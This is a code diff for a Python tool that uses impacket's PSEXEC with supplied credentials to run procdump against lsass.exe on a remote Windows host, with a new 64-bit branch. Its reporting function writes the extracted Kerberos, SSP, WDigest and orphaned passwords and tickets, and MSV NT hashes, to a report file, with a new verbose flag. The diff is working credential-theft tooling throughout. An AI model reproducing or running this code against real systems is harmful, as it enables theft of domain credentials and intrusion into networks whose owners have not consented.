@@ -6,7 +6,6 @@ from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5.transport import DCERPCTransportFactory
 from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
 
-# from getArch import TARGETARCH
 ################################################################
 
 from configuration import src_x32, src_x64
@@ -17,7 +16,6 @@ import re
 import json
 import os
 import sys
-import pdb
 
 #########################Pypykatz##############################
 
@@ -121,21 +119,38 @@ class Dumper:
         executer.run(
             remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
         )
-        executer = PSEXEC(
-            " ".join(["C:\\procdump.exe -ma lsass.exe C:\\lsass_dump"]),
-            None,
-            None,
-            None,
-            int(445),
-            self.credentials["username"],
-            self.credentials["password"],
-            self.credentials["domain"],
-            None,
-            None,
-            False,
-            None,
-            "",
-        )
+        if self.host_info["arch"] == 64:
+            executer = PSEXEC(
+                " ".join(["C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump"]),
+                None,
+                None,
+                None,
+                int(445),
+                self.credentials["username"],
+                self.credentials["password"],
+                self.credentials["domain"],
+                None,
+                None,
+                False,
+                None,
+                "",
+            )
+        else:
+            executer = PSEXEC(
+                " ".join(["C:\\procdump.exe -ma lsass.exe C:\\lsass_dump"]),
+                None,
+                None,
+                None,
+                int(445),
+                self.credentials["username"],
+                self.credentials["password"],
+                self.credentials["domain"],
+                None,
+                None,
+                False,
+                None,
+                "",
+            )
         executer.run(
             remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
         )
@@ -185,7 +200,7 @@ class Dumper:
         print("Finished")
 
     @staticmethod
-    def create_report(filename):
+    def create_report(filename, verbose):
         print("Creating report")
         with open("./temp_report.json", "r") as jf:
             parsed = json.load(jf)["./lsass_dump.dmp"]
@@ -196,52 +211,82 @@ class Dumper:
                         for cr in temp["kerberos_creds"]:
                             if cr["username"] is not None:
                                 if cr["password"] is not None:
-                                    report.write(
-                                        f"From Kerberos (Domain/username:password) -- {cr['domainname']}/{cr['username']}:{cr['password']}\n"
-                                    )
+                                    if verbose == 1:
+                                        report.write(
+                                            f"From Kerberos (Domain/username:password) -- {cr['domainname']} / {cr['username']}:{cr['password']}\n"
+                                        )
+                                    else:
+                                        report.write(
+                                            f"{cr['domainname']} / {cr['username']}:{cr['password']}\n"
+                                        )
                                 elif len(cr["tickets"]) > 0:
-                                    report.write(
-                                        f"From Kerberos (Domain/username:tickets) -- {cr['domainname']}/{cr['username']}:{cr['tickets']}\n"
-                                    )
+                                    if verbose == 1:
+                                        report.write(
+                                            f"From Kerberos (Domain/username:tickets) -- {cr['domainname']} / {cr['username']}:{cr['tickets']}\n"
+                                        )
+                                    else:
+                                        report.write(
+                                            f"Tickets--{cr['domainname']} / {cr['username']}:{cr['tickets']}\n"
+                                        )
                     if len(temp["livessp_creds"]) > 0:
                         report.write("Did not expect creds to be in livessp\n")
                     if len(temp["ssp_creds"]) > 0:
                         for cr in temp["ssp_creds"]:
                             if cr["username"] is not None:
                                 if cr["password"] is not None:
-                                    report.write(
-                                        f"From SSP (Domain/username:password) -- {cr['domainname']}/{cr['username']}:{cr['password']}\n"
-                                    )
-                    if len(temp["tspkg_creds"]) > 0:
-                        report.write(
-                            "Have no idea, what is tspkg and how to parse it\n"
-                        )
+                                    if verbose == 1:
+                                        report.write(
+                                            f"From SSP (Domain/username:password) -- {cr['domainname']}/{cr['username']}:{cr['password']}\n"
+                                        )
+                                    else:
+                                        report.write(
+                                            f"{cr['domainname']}/{cr['username']}:{cr['password']}\n"
+                                        )
                     if len(temp["wdigest_creds"]) > 0:
                         for cr in temp["wdigest_creds"]:
                             if cr["username"] is not None:
                                 if cr["password"] is not None:
-                                    report.write(
-                                        f"From Wdigest (Domain/username:password) -- {cr['domainname']} / {cr['username']}:{cr['password']}\n"
-                                    )
+                                    if verbose == 1:
+                                        report.write(
+                                            f"From Wdigest (Domain/username:password) -- {cr['domainname']} / {cr['username']}:{cr['password']}\n"
+                                        )
+                                    else:
+                                        report.write(
+                                            f"{cr['domainname']} / {cr['username']}:{cr['password']}\n"
+                                        )
                     if len(temp["msv_creds"]) > 0:
                         for cr in temp["msv_creds"]:
                             if cr["username"] is not None:
                                 if cr["NThash"] is not None:
-                                    report.write(
-                                        f"From MSV (Domain/username:NThash) -- {cr['domainname']} / {cr['username']}:{cr['NThash']}\n"
-                                    )
+                                    if verbose == 1:
+                                        report.write(
+                                            f"From MSV (Domain/username:NThash) -- {cr['domainname']} / {cr['username']}:{cr['NThash']}\n"
+                                        )
+                                    else:
+                                        report.write(
+                                            f"NTHASH--{cr['domainname']} / {cr['username']}:{cr['NThash']}\n"
+                                        )
 
                 for el in parsed["orphaned_creds"]:
-                    # temp = parsed["orphaned_creds"][el]
                     if "username" in el.keys() and el["username"] is not "":
                         if el["password"] is not None:
-                            report.write(
-                                f"From orphaned creds (Domain/username:password) -- {el['domainname']}/{el['username']}:{el['password']}\n"
-                            )
+                            if verbose == 1:
+                                report.write(
+                                    f"From orphaned creds (Domain/username:password) -- {el['domainname']} / {el['username']}:{el['password']}\n"
+                                )
+                            else:
+                                report.write(
+                                    f"{el['domainname']} / {el['username']}:{el['password']}\n"
+                                )
                         elif "tickets" in el.keys() and len(el["tickets"]) > 0:
-                            report.write(
-                                f"From orphaned creds (Domain/username:tickets) -- {el['domainname']}/{el['username']}:{el['tickets']}\n"
-                            )
+                            if verbose == 1:
+                                report.write(
+                                    f"From orphaned creds (Domain/username:tickets) -- {el['domainname']} / {el['username']}:{el['tickets']}\n"
+                                )
+                            else:
+                                report.write(
+                                    f"Tickets--{el['domainname']} / {el['username']}:{el['tickets']}\n"
+                                )
         os.remove("./temp_report.json")
         print("Finished :)")
 
@@ -250,5 +295,3 @@ class Dumper:
         self.exec_procdump()
         self.dump_lsass()
         self.clear_out()
-        Dumper.dump_to_pypykatz("./lsass_dump.dmp")
-        Dumper.create_report(f'./reports/{self.host_info["target"]}_report.txt')
